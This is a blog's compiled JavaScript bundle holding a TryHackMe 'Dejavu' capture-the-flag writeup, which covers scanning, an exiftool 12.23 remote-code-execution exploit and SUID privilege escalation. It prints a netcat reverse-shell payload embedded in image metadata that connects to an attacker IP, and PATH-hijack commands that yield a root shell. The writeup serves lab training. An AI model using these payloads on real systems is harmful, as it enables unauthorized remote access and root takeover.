"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[2193],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return d}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),m=p(n),d=r,h=m["".concat(s,".").concat(d)]||m[d]||u[d]||o;return n?a.createElement(h,i(i({ref:t},c),{},{components:n})):a.createElement(h,i({ref:t},c))}));function d(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=m;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},10600:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return p},assets:function(){return c},toc:function(){return u},default:function(){return d}});var a=n(87462),r=n(63366),o=(n(67294),n(3905)),i=["components"],l={title:"THM Dejavu writeup",description:"Tryhackme Dejavu room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png",slug:"dejavu",tags:["exiftool","SUID","PATH"]},s=void 0,p={permalink:"/Cybernotes/blog/dejavu",source:"@site/blog/2022-03-02-Dejavu/Dejavu.md",title:"THM Dejavu writeup",description:"Tryhackme Dejavu room writeup",date:"2022-03-02T00:00:00.000Z",formattedDate:"March 2, 2022",tags:[{label:"exiftool",permalink:"/Cybernotes/blog/tags/exiftool"},{label:"SUID",permalink:"/Cybernotes/blog/tags/suid"},{label:"PATH",permalink:"/Cybernotes/blog/tags/path"}],readingTime:1.94,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"THM Dejavu writeup",description:"Tryhackme Dejavu room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png",slug:"dejavu",tags:["exiftool","SUID","PATH"]},nextItem:{title:"THM Dogcat writeup",permalink:"/Cybernotes/blog/dogcat"}},c={authorsImageUrls:[void 0]},u=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Gobuster results",id:"gobuster-results",children:[],level:2},{value:"Enumration",id:"enumration",children:[],level:2},{value:"Privesc",id:"privesc",children:[],level:2}],m={toc:u};function d(e){var t=e.components,l=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,a.Z)({},m,l,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Hello everyone,"),(0,o.kt)("p",null,"Today we are going to solve Dejavu room from tryhackme. we will see about exiftool RCE and privilege escalation with PATH variable and systemctl SUID."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png",alt:null})),(0,o.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey:\n|   3072 30:0f:38:8d:3b:be:67:f3:e0:ca:eb:1c:93:ad:15:86 (RSA)\n|   256 46:09:66:2b:1f:d1:b9:3c:d7:e1:73:0f:2f:33:4f:74 (ECDSA)\n|_  256 a8:43:0e:d2:c1:a9:d1:14:e0:95:31:a1:62:94:ed:44 (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Dog Gallery!\n")),(0,o.kt)("h2",{id:"gobuster-results"},"Gobuster results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"===============================================================\n/favicon.ico          (Status: 200) [Size: 21665]\n/index.html           (Status: 301) [Size: 0] [--\x3e ./]\n/upload               (Status: 301) [Size: 0] [--\x3e upload/]\n===============================================================\n")),(0,o.kt)("h2",{id:"enumration"},"Enumration"),(0,o.kt)("p",null,"--\x3e I found this page on port ",(0,o.kt)("inlineCode",{parentName:"p"},"80")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(20153).Z,width:"1907",height:"845"})),(0,o.kt)("p",null,"--\x3e And when we click on any photo then it redirects us to ",(0,o.kt)("inlineCode",{parentName:"p"},"/dog/getexifdata")," and for caption and title it was using ",(0,o.kt)("inlineCode",{parentName:"p"},"/dog/getmetadata")," path which i found from burpsuite."),(0,o.kt)("p",null,"--\x3e Also i found the version of ",(0,o.kt)("inlineCode",{parentName:"p"},"exiftool")," from response from ",(0,o.kt)("inlineCode",{parentName:"p"},"getexifdata")," route"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(89191).Z,width:"1595",height:"795"})),(0,o.kt)("p",null,"--\x3e So i searched for ",(0,o.kt)("inlineCode",{parentName:"p"},"exiftool version 12.23 exploit")," and found ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/OneSecCyber/JPEG_RCE",title:"https://github.com/OneSecCyber/JPEG_RCE"},"this")," repo which describes the exploit in detail"),(0,o.kt)("p",null,"So i added the reverse shell in the image file using exiftool"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"exiftool -config eval.config runme.jpg -eval='system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.10 4444 >/tmp/f\")'\n")),(0,o.kt)("p",null,"--\x3e After that i went to ",(0,o.kt)("inlineCode",{parentName:"p"},"/upload/")," where we can upload our image so i uploaded my payload and started the netcat listener on port ",(0,o.kt)("inlineCode",{parentName:"p"},"4444")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(85896).Z,width:"1361",height:"433"})),(0,o.kt)("p",null,"Now let's just click on the uploaded image to let the server see the exifdata of image and we can get the reverse shell."),(0,o.kt)("p",null,"And boom i got the reverse shell!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(58319).Z,width:"1687",height:"337"})),(0,o.kt)("h2",{id:"privesc"},"Privesc"),(0,o.kt)("p",null,"--\x3e This file contains one SUID binary called ",(0,o.kt)("inlineCode",{parentName:"p"},"serverManager"),". when we run that binary it asks for input from ",(0,o.kt)("inlineCode",{parentName:"p"},"0")," or ",(0,o.kt)("inlineCode",{parentName:"p"},"1")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"0 - Get server status\n1 - Restart server\n")),(0,o.kt)("p",null,"--\x3e so here it's restarting the server means it must be running as root SUID binary. so we can use this as privesc factor."),(0,o.kt)("p",null,"So let's see the source code provided with it."),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(32664).Z,width:"1005",height:"373"})),(0,o.kt)("p",null,"--\x3e I found that it's using ",(0,o.kt)("inlineCode",{parentName:"p"},"systemctl")," so let's change the path variable for that and get the root shell!"),(0,o.kt)("p",null,"So follow these commands:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'echo "/bin/bash -p" > systemctl\nchmod 777 systemctl\nexport PATH=.:$PATH\n')),(0,o.kt)("p",null,"And now if you run the ",(0,o.kt)("inlineCode",{parentName:"p"},"serverManager")," binary and select ",(0,o.kt)("inlineCode",{parentName:"p"},"0")," then you will get root shell!!"),(0,o.kt)("p",null,"--\x3e And we pwned the machine!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(56223).Z,width:"1225",height:"543"})))}d.isMDXComponent=!0},20153:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215131947-2aa8b3b423f4803a650c2d387f030e34.png"},89191:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215132320-3dbbe00611a6fa1f27c6b29e0a3ee2cb.png"},58319:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215132900-3076bc797247395e6c6ad28736cfe755.png"},85896:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215133145-f8e6b2cac02684ce820e3179ad9a57c1.png"},32664:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215133406-533f1ea3eed8a2e15d1835816eb4a28e.png"},56223:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220215133710-bd3e4a7b6dc37255c675edcfc302d1df.png"}}]);